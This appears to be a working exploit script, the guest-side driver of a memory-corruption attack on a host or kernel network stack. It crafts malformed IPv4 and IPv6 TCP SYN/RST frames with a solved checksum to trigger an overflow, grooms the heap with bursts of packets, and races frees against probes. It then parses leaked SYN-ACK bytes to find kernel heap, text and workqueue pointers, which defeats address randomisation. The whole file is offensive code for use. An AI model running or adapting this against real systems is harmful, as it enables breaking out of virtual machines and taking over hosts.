#!/usr/bin/env python3
# r7_guest.py -- L2-guest side of the r7 successor-slot protocol.
# subcommands:
#   alloc <triplets> <extra> <vbase> <ovbase> <sbase>
#   read  <sport> <seq> [tag]
#   burst <gw0> <k>
#   rst   <sport> <seq>
#   tight <vsport> <vseq> <ssport> <sseq> <gw> <ovsport> <ovseq> <wire> <payload_hexfile>
#   duptight <vsport> <vseq> <ssport> <sseq> <gw> <tag>
#                (RST Y, RST X, probe, duplicate SYN of Y -> capture live window)
import sys, time, socket, subprocess, struct, re, os
sys.path.insert(0, "/tmp")
import guest_exploit as ge

DN = subprocess.DEVNULL
IFN = "enp1s0"
HOSTMAC = bytes.fromhex("52540007c60b")
GUESTMAC = bytes.fromhex("525400b239e6")

def csum16(d):
    if len(d) % 2: d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d)//2), d))
    while s >> 16: s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def v6tcp(g, sport, seq):
    src = bytes.fromhex("fd010000") + struct.pack(">H", g) + b"\0"*8 + b"\x00\x01"
    dst = bytes.fromhex("fd000001000000000000000000000001")
    th = bytearray(20)
    struct.pack_into(">HHII", th, 0, sport, 22, seq, 0)
    th[12] = 5 << 4; th[13] = 0x02; struct.pack_into(">H", th, 14, 0x4000)
    pseudo = src + dst + struct.pack(">I", len(th)) + b"\0\0\0" + bytes([6])
    struct.pack_into(">H", th, 16, csum16(pseudo + bytes(th)))
    ip6 = struct.pack(">IHBB", 0x60000000, len(th), 6, 64) + src + dst
    return HOSTMAC + GUESTMAC + struct.pack(">H", 0x86dd) + ip6 + bytes(th)

def synopt(*a):
    subprocess.run(["sudo", "/tmp/synopt"] + [str(x) for x in a], stdout=DN, stderr=DN)

def oktext(v): return 0xffffffff80000000 <= v <= 0xffffffffc0000000
def okheap(v): return 0xffff888000000000 <= v <= 0xffffc87fffffffff
def okkern(v): return 0xffff800000000000 <= v <= 0xffffffffffffffff

def _csum_partial(d):
    s = 0; i = 0
    while i + 1 < len(d):
        s += d[i] | (d[i + 1] << 8); i += 2
    if i < len(d): s += d[i]
    return s

def _csum_fold(s):
    s = (s & 0xffff) + (s >> 16); s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def ip_frame(sport, seq, payload, wire, ack=0):
    """ge.ip_frame with the O(1) wire solve (verified vs the 65536 loop). _s0"""
    hl = 32; thlen = 20
    ip = bytearray(hl + thlen + len(payload))
    ip[0] = 0x48; struct.pack_into(">H", ip, 2, len(ip)); struct.pack_into(">H", ip, 4, 0x4242)
    ip[8] = 64; ip[9] = 6; ip[12:16] = ge.src4; ip[16:20] = ge.dst4
    ip[20] = 7; ip[21] = 11; ip[22] = 12
    for i in range(23, 31): ip[i] = 0x40 + i
    ip[31] = 0
    th = memoryview(ip)[hl:]
    struct.pack_into(">HHII", th, 0, sport, 7778, seq, ack & 0xffffffff)
    th[12] = 5 << 4; th[13] = 0x02; struct.pack_into(">H", th, 14, 0x4000)
    th[thlen:] = payload
    pseudo = ge.src4 + ge.dst4 + b"\0" + bytes([6]) + struct.pack(">H", thlen + len(payload))
    struct.pack_into(">H", th, 16, ge.csum(pseudo + bytes(th[:thlen + len(payload)])))
    vhdr = bytearray(10)
    if wire is not None:
        want = ((wire << 8) | (wire >> 8)) & 0xffff
        ip[25] = 0; ip[26] = 0
        S0 = _csum_partial(bytes(ip[21:])); L = S0 & 0xffff; Hh = S0 >> 16
        T = (~want) & 0xffff
        found = None
        for w in ((T - L - Hh) % 0xffff, (T - L - Hh - 1) % 0xffff):
            ip[25] = w & 0xff; ip[26] = (w >> 8) & 0xff
            if _csum_fold(_csum_partial(bytes(ip[21:]))) == want:
                found = w; break
        if found is None:
            raise RuntimeError("wire solve failed")
        struct.pack_into(">H", ip, 10, 0); struct.pack_into(">H", ip, 10, ge.csum(bytes(ip[:hl])))
        vhdr[0] = 1; struct.pack_into("<H", vhdr, 6, 22 + 21)
    else:
        struct.pack_into(">H", ip, 10, 0); struct.pack_into(">H", ip, 10, ge.csum(bytes(ip[:hl])))
    eth = ge.macd + ge.macs + struct.pack(">H", 0x8100) + b"\0\0" + struct.pack(">H", 0x8100) + b"\0\0" + struct.pack(">H", 0x0800)
    return bytes(vhdr) + eth + bytes(ip)

def classify(fr):
    # window starts at victim O + 32 ; w[off] is the byte at O+32+off
    w = fr[20:275]
    out = []
    if len(w) < 255: return out
    for off in range(0, 240, 8):
        q0 = int.from_bytes(w[off:off+8], "little")
        q1 = int.from_bytes(w[off+8:off+16], "little")
        q2 = int.from_bytes(w[off+16:off+24], "little")
        q3 = int.from_bytes(w[off+24:off+32], "little")
        tgt = w[off+32:off+48] if off+48 <= len(w) else b""
        rec = None
        # live __rt6_probe_work: data=pwq|5, entry.next/prev = poolhead, func text, target fe80::
        if (okheap(q0) and (q0 & 0x7) == 5 and okkern(q1) and okkern(q2)
                and oktext(q3) and tgt[:2] == b"\xfe\x80"):
            rec = ("LIVE", off, q0, q1, q2, q3)
        # freed work residue: entry.next == entry.prev == A+8
        elif okheap(q1) and (q1 & 0x3f) == 8 and q1 == q2 and oktext(q3):
            rec = ("RES", off, q1-8, q1, q2, q3)
        if rec:
            out.append(rec + (tgt.hex(),))
    return out

def parse(path, tag=""):
    t = open(path).read()
    n = 0
    for mm in re.finditer(r"RX \S+ -> \S+ ihl=(\d+) tot=(\d+)\n\s+hex ([0-9a-f]+)", t):
        fr = bytes.fromhex(mm.group(3))
        if len(fr) < 20 or (fr[0] >> 4) != 4: continue
        if fr[12:16] != bytes([192,168,250,1]): continue
        if len(fr) < 299: continue
        tot = int(mm.group(2))
        if tot != 299: continue
        n += 1
        # dport is the last 2 bytes before the 255-byte options area in the
        # corrupted SYN-ACK: TCP header at fr[20:40]? synsniff prints IP+TCP+data
        dp = None
        for base in (40, 32, 275):
            if base+4 <= len(fr):
                try:
                    sp, d = struct.unpack_from(">HH", fr, base)
                    if sp == 7778: dp = d; break
                except Exception: pass
        print("WIN %s n=%d tot=%d dport=%s" % (tag, n, tot, dp))
        for kind, off, a, b, c, f, tgt in classify(fr):
            kk = ((off + 32) // 64) if kind == "LIVE" else ((off + 24) // 64)
            print("  %s off=%d k=%d A=%#x q0=%#x q1=%#x q2=%#x func=%#x tgt=%s" %
                  (kind, off, kk, a, b, c, f, tgt))
    if n == 0: print("WIN %s n=0" % tag)
    return n

def force_read(pairs, tag, wait=0.45):
    subprocess.run(["sudo", "pkill", "-x", "synsniff"], stderr=DN)
    subprocess.run(["sudo", "rm", "-f", "/tmp/ph.log"], stderr=DN)
    sn = subprocess.Popen(["sudo", "/tmp/synsniff", "-i", IFN, "-t", "3"],
                          stdout=open("/tmp/ph.log", "w"), stderr=DN)
    time.sleep(0.08)
    tx = ge.sock()
    for sp, sq in pairs:
        tx.send(ip_frame(sp, sq, b"A"*64, None)); time.sleep(0.002)
    time.sleep(wait)
    try: sn.terminate()
    except Exception: pass
    time.sleep(0.12)
    return parse("/tmp/ph.log", tag)

def main():
    mode = sys.argv[1]
    if mode == "prime":
        n = int(sys.argv[2]); base = int(sys.argv[3])
        tx = ge.sock(); t0 = time.time()
        for i in range(n):
            tx.send(ip_frame(base+i, 0xE0000000+i, b"A"*64, None))
        print("PRIME n=%d base=%d dt=%.1fms" % (n, base, (time.time()-t0)*1e3))
        return 0
    if mode == "freeprime":
        sp = int(sys.argv[2]); sq = int(sys.argv[3], 0); sp2 = int(sys.argv[4]); sq2 = int(sys.argv[5], 0)
        dly = float(sys.argv[6]) if len(sys.argv) > 6 else 0.0
        tx = ge.sock()
        tx.send(ge.ip_rst_frame(sp, sq+1))
        if dly: time.sleep(dly/1000.0)
        tx.send(ip_frame(sp2, sq2, b"A"*64, None))
        print("FREEPRIME rst=%d new=%d" % (sp, sp2))
        return 0
    if mode == "freeprobe":
        sp = int(sys.argv[2]); sq = int(sys.argv[3], 0); gw = int(sys.argv[4], 0)
        dly = float(sys.argv[5]) if len(sys.argv) > 5 else 0.0
        tx = ge.sock(); pv = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); pv.bind((IFN, 0))
        t0 = time.time()
        tx.send(ge.ip_rst_frame(sp, sq+1))
        if dly: time.sleep(dly/1000.0)
        pv.send(v6tcp(gw, 37000, 0xE2000000))
        print("FREEPROBE sp=%d gw=%#x dly=%sms dt=%.1fus" % (sp, gw, dly, (time.time()-t0)*1e6))
        return 0
    if mode == "ovburst":
        base = int(sys.argv[2]); n = int(sys.argv[3])
        pp = bytearray(256)
        for i in range(256): pp[i] = 0x41 + i % 26
        for b in (16, 80, 144, 208):
            pp[b:b+4] = ge.src4; pp[b+4:b+8] = b"\0"*4; pp[b+8] = 255; pp[b+9:b+16] = b"\0"*7
        tx = ge.sock(); t0 = time.time()
        for i in range(n):
            tx.send(ip_frame(base+i, 0xA1000000+i, bytes(pp), 0x4000))
        print("OVBURST n=%d base=%d dt=%.1fms" % (n, base, (time.time()-t0)*1e3))
        return 0
    if mode == "alloc":
        nt = int(sys.argv[2]); extra = int(sys.argv[3])
        vbase = int(sys.argv[4]); ovbase = int(sys.argv[5]); sbase = int(sys.argv[6])
        # overflow-first pairs: [ov, victim, (optional successor if sbase>0)]
        pp = bytearray(256)
        for i in range(256): pp[i] = 0x41 + i % 26
        for base in (16, 80, 144, 208):
            pp[base:base+4] = ge.src4
            pp[base+4:base+8] = b"\0"*4
            pp[base+8] = 255
            pp[base+9:base+16] = b"\0"*7
        tx = ge.sock()
        t0 = time.time()
        for i in range(nt):
            tx.send(ip_frame(ovbase+i, 0xA0000000+i, bytes(pp), 0x4000))
            tx.send(ip_frame(vbase+i, 0xB0000000+i, b"A"*64, None))
            if sbase > 0:
                tx.send(ip_frame(sbase+i, 0xC0000000+i, b"A"*64, None))
        for i in range(extra):
            tx.send(ip_frame(vbase+100+i, 0xD0000000+i, b"A"*64, None))
        print("ALLOC pairs=%d extra=%d v=%d ov=%d s=%d dt=%.1fms" %
              (nt, extra, vbase, ovbase, sbase, (time.time()-t0)*1e3))
        return 0
    if mode == "read":
        sp = int(sys.argv[2]); sq = int(sys.argv[3], 0)
        tag = sys.argv[4] if len(sys.argv) > 4 else "read"
        force_read([(sp, sq)], tag); return 0
    if mode == "readmany":
        pairs = []
        for a in sys.argv[2:]:
            sp, sq = a.split(":")
            pairs.append((int(sp), int(sq, 0)))
        force_read(pairs, "many"); return 0
    if mode == "burst":
        g0 = int(sys.argv[2], 0); k = int(sys.argv[3])
        pv = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); pv.bind((IFN, 0))
        for i in range(k):
            pv.send(v6tcp(g0+i, 35000+i, 0xE0000000+i))
        print("BURST g0=%#x k=%d" % (g0, k)); return 0
    if mode == "rst":
        sp = int(sys.argv[2]); sq = int(sys.argv[3], 0)
        tx = ge.sock(); n = tx.send(ge.ip_rst_frame(sp, sq+1)); print("RST", sp, "sent", n); return 0
    if mode == "rstplain":
        sp = int(sys.argv[2]); sq = int(sys.argv[3], 0)
        tx = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); tx.bind((IFN, 0))
        n = tx.send(ge.ip_rst_frame(sp, sq+1)[10:]); print("RSTPLAIN", sp, "sent", n); return 0
    if mode == "tight":
        vs = int(sys.argv[2]); vq = int(sys.argv[3], 0)
        ss = int(sys.argv[4]); sq = int(sys.argv[5], 0)
        g = int(sys.argv[6], 0); ovs = int(sys.argv[7]); ovq = int(sys.argv[8], 0)
        wire = int(sys.argv[9], 0); pf = sys.argv[10]
        payload = bytes.fromhex(open(pf).read().strip())
        tx = ge.sock()
        pv = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); pv.bind((IFN, 0))
        t0 = time.time()
        tx.send(ge.ip_rst_frame(vs, vq+1))
        tx.send(ge.ip_rst_frame(ss, sq+1))
        pv.send(v6tcp(g, 36000, 0xE1000000))
        tx.send(ip_frame(ovs, ovq, payload, wire))
        print("TIGHT dt=%.1fus wire=%#x" % ((time.time()-t0)*1e6, wire)); return 0
    if mode == "duptight":
        vs = int(sys.argv[2]); vq = int(sys.argv[3], 0)
        ss = int(sys.argv[4]); sq = int(sys.argv[5], 0)
        g = int(sys.argv[6], 0); tag = sys.argv[7] if len(sys.argv) > 7 else "dup"
        tx = ge.sock()
        pv = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); pv.bind((IFN, 0))
        # capture first, then free X, probe, duplicate SYN of Y while W is queued
        subprocess.run(["sudo", "pkill", "-x", "synsniff"], stderr=DN)
        subprocess.run(["sudo", "rm", "-f", "/tmp/ph.log"], stderr=DN)
        sn = subprocess.Popen(["sudo", "/tmp/synsniff", "-i", IFN, "-t", "3"],
                              stdout=open("/tmp/ph.log", "w"), stderr=DN)
        time.sleep(0.08)
        tx.send(ge.ip_rst_frame(ss, sq+1))
        pv.send(v6tcp(g, 36000, 0xE1000000))
        tx.send(ip_frame(vs, vq, b"A"*64, None))
        time.sleep(0.45)
        try: sn.terminate()
        except Exception: pass
        time.sleep(0.12)
        parse("/tmp/ph.log", tag); return 0
    print("unknown mode"); return 2

main()
